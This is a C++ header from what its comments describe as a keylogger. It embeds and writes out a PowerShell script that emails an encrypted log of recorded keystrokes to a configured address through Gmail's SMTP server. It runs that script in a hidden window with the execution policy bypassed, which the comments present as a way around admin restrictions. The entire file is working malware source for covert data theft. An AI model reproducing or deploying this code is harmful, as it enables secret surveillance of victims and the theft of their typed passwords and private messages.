#ifndef SENDMAIL_H_INCLUDED
#define SENDMAIL_H_INCLUDED

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "[powershell_name].ps1"

//sendmail.h uses powershell to send an email detailing the keystrokes recorded within the time frame
//by attaching the encrypted .log file to the email
namespace Mail
{
    #define X_EM_TO "[recipient email address]"
    #define X_EM_FROM "[sender email address]"
    #define X_EM_PASS "[sender email password]"

const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

    //replaces the "what" in a string with the "with"
    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
        {
            return s;
        }
        size_t sp=0;

        while( (sp=s.find(what,sp) ) != std::string::npos)
        {
            s.replace(sp, what.length(), with), sp +=with.length();
        }
        return s;
    }

    //checks if file was created ok
    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;
    }

    //creates the powershell script using the variable above and checks if it was
    //created ok
    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        if(!script)
        {
            return false;
        }
        script << PowerShellScript;

        if(!script)
        {
            return false;
        }
        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;

        //making sure the Directory exists
        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
        {
            return -1;
        }
        //getting the path and the script name and placing them in a super string
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        //if file doesn't exist: create it
        if(!CheckFileExists(scr_path))
        {
            ok = CreateScript();
        }
        //if creation was unsuccessful return
        if(!ok)
        {
            return -2;
        }

        //powershell requires admin rights to work
        //however we can use this flag to bypasss that
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachments + "\"";
        //this is windows api
        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        //if script wasn't executed return -3
        if(!ok)
        {
            return -3;
        }
        //wait for 7 seconds
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        //this is an anon function, also known as the lambda function
        //new to c++11
        //we're using it here to access all the variables from the sendmail function
        m_timer.SetFunction([&] ()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 6000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            //now we got the exit code
            //if its 259, then it couldnt follow thru
            //but its still running so we gotta terminate that
            if( (int)exit_code == STILL_ACTIVE)
            {
                TerminateProcess(ShExecInfo.hProcess, 100);
            }
            Helper::WriteAppLog("<From SendMail> Return Code: " + Helper::ToString( (int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;

    }

    //allows us to send multiple attachments
    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U) //1 unsigned integar
        {
            attachments = att.at(0);
        }
        else
        {
            for(const auto &v : att)
            {
                attachments += v + "::";
            }
            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return SendMail(subject, body, attachments);
    }

}


#endif // SENDMAIL_H_INCLUDED
